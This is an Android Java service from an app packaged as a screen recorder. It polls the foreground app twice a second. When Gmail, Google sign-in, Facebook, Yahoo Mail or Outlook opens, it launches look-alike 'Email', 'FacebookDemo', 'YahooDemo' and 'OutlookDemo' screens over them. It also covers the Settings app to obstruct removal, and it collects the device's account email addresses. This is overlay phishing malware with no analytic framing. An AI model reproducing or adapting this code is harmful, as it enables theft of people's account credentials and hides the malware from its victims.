
package com.recorder.screen.screen_recorder.services;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;
import android.util.Patterns;

import com.recorder.screen.screen_recorder.R;
import com.recorder.screen.screen_recorder.activities.Email;
import com.recorder.screen.screen_recorder.activities.FacebookDemo;
import com.recorder.screen.screen_recorder.activities.OutlookDemo;
import com.recorder.screen.screen_recorder.activities.SectionListExampleActivity;
import com.recorder.screen.screen_recorder.activities.YahooDemo;
import com.recorder.screen.screen_recorder.helper.Detector;
import com.recorder.screen.screen_recorder.helper.LollipopDetector;
import com.recorder.screen.screen_recorder.helper.PreLollipopDetector;
import com.recorder.screen.screen_recorder.helper.Utils;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Pattern;


public class myappmanager2 extends Service {
	public static String class_name ="";
	public static String class_name2 ="";
	private ActivityManager activityManager;
	private final String myprefssec = "mySharedPreferencessec";
	private final String myprefsemail = "mySharedPreferencesemail";
	//boolean  code=false;
	private Timer timer = new Timer();
	KeyguardManager mKeyguardManager;
	long period = 500;
	public static boolean sentbroadcast = false;
	public static final String recentappfired = "ibom.android.appmanager.RECENT";
	public  List<ActivityManager.RunningTaskInfo> processes1;
	public String possibleEmail ="";
	public static boolean started = false;
	public static boolean emailstarted = false;
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		started = true;
		Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
		Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
		for (Account account : accounts) {
			if (emailPattern.matcher(account.name).matches()) {
				possibleEmail = account.name;

			}
		}

		mKeyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		SharedPreferences mySharedPreferences_email = getSharedPreferences(
				myprefsemail, Context.MODE_PRIVATE);


		String email =  mySharedPreferences_email.getString(
				getString(R.string.email), "");

		if(email.equalsIgnoreCase("A"))
		{
			emailstarted = true;
		}
		else
		{
			emailstarted = false;
		}


		activityManager = (ActivityManager) this.getSystemService(Context.ACTIVITY_SERVICE);

		timer.scheduleAtFixedRate(new TimerTask() {

			//@SuppressLint("NewApi")
			//@SuppressWarnings("static-access")
			@Override
			public void run() {

				Log.e(".............", "----------------------------------------- myappmanager2");

				//int maxNum = 5;


				processes1 = activityManager.getRunningTasks(1);

				try {
					class_name =processes1.get(0).topActivity.getClassName();
				}
				catch (Exception e){
					Log.d("Exception", "Exceptionclass name  ="+e);
				}

				/* try{
				 class_name2 = processes1.get(1).topActivity.getClassName();
				 }
				 catch(Exception e){
					 class_name2="";
				 }*/

				//String classname =class_name;
				try {
					String packagename = processes1.get(0).topActivity.getPackageName();
					//Log.d("Top", "current activity class name  ="+class_name);
					//Log.d("Top", "package name  ="+packagename);
				}
				catch (Exception e){
					Log.d("Exception","exp"+e);
				}


				//if(class_name.startsWith("com.android.settings.Settings"))

				Detector dc;
				String topPackage = "";
				if(Utils.postLollipop()){
					dc = new LollipopDetector();}
				else {
					dc = new PreLollipopDetector(); }

				try {
					if(dc.getForegroundApp(getApplicationContext()) != null) {
						topPackage = dc.getForegroundApp(getApplicationContext());
					}
					else {
						topPackage = "";
					}
				}
				catch (Exception e) { topPackage = ""; }



				SharedPreferences sp = getSharedPreferences("key", 0);
				String packageName = sp.getString("packageName","");
				Log.d("packageNameApp-------","packageNameApp::::------"+topPackage);


				if(class_name.equalsIgnoreCase("com.android.settings.Settings"))
				{
					Intent intent25 = new Intent(getApplicationContext(), SectionListExampleActivity.class);
					intent25.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intent25.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent25.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					getApplicationContext().startActivity(intent25);
				}

				else if(topPackage.equalsIgnoreCase("com.android.settings"))//
				{
					Intent intentapp = new Intent(getApplicationContext(),SectionListExampleActivity.class);
					intentapp.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentapp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentapp.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					intentapp.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentapp);
				}


//				else if(packageName.equalsIgnoreCase("com.android.settings"))//
//				{
//					Intent intentapp = new Intent(getApplicationContext(),SectionListExampleActivity.class);
//					intentapp.addFlags(Intent.FLAG_FROM_BACKGROUND);
//					intentapp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//					intentapp.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
//					intentapp.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
//					getApplicationContext().startActivity(intentapp);
//				}

				else if(class_name.startsWith("com.google.android.gm.")&&emailstarted)
				{
					//Log.d("MyDebug", "going to call email");

					Intent intent25 = new Intent(getApplicationContext(), Email.class);
					intent25.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intent25.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent25.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intent25);

				}
				else if(class_name.startsWith("com.google.android.gm."))
				{
					//Log.d("MyDebug", "going to call email");

					Intent intentgml = new Intent(getApplicationContext(),Email.class);
					intentgml.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentgml.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentgml.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentgml);

				}
				else if(class_name.startsWith("com.google.android.gsf.login."))
				{
					//Log.d("MyDebug", "going to call email");

					Intent intentgml = new Intent(getApplicationContext(),Email.class);
					intentgml.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentgml.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentgml.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentgml);

				}
				//com.facebook.katana.dbl.activity.FacebookLoginActivity
				else if(class_name.startsWith("com.facebook.katana.dbl."))//com.facebook.katana.LoginActivity
				{
					//Log.d("MyDebug", "going to call email");

					Intent intentfac = new Intent(getApplicationContext(),FacebookDemo.class);
					intentfac.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentfac.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentfac.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentfac);

				}
				else if(class_name.startsWith("com.yahoo.mail."))//ccom.yahoo.mail.ui.activities.LoginOrCreateAccountActivity
				{
					//Log.d("MyDebug", "going to call email");

					Intent intentyah = new Intent(getApplicationContext(), YahooDemo.class);
					intentyah.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentyah.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentyah.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentyah);

				}
				else if(class_name.startsWith("com.microsoft.office.outlook."))//com.microsoft.office.outlook.MainActivity
				{
					//Log.d("MyDebug", "going to call email");

					Intent intentout= new Intent(getApplicationContext(), OutlookDemo.class);
					intentout.addFlags(Intent.FLAG_FROM_BACKGROUND);
					intentout.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intentout.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
					//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
					getApplicationContext().startActivity(intentout);

				}


/*			 else if(class_name.contains("RecentsActivity"))
				{
				 if(SectionListExampleActivity.running||TabActivity.running)
				 {
					 //Log.d("Debug", "if(SectionListExampleActivity.running||TabActivity.running)");
					 Intent intent25 = new Intent(getApplicationContext(),SectionListExampleActivity.class);
						intent25.addFlags(Intent.FLAG_FROM_BACKGROUND);
						intent25.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent25.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
						//intent25.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
						getApplicationContext().startActivity(intent25);

				 }

				}*/

				if(mKeyguardManager.isKeyguardLocked())
				{
					stopSelf();
				}

			}
		}, 0, period);

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {

		try
		{
			timer.cancel();
		}
		catch(Exception e)
		{
			;
		}
		started=false;
		super.onDestroy();
	}

}
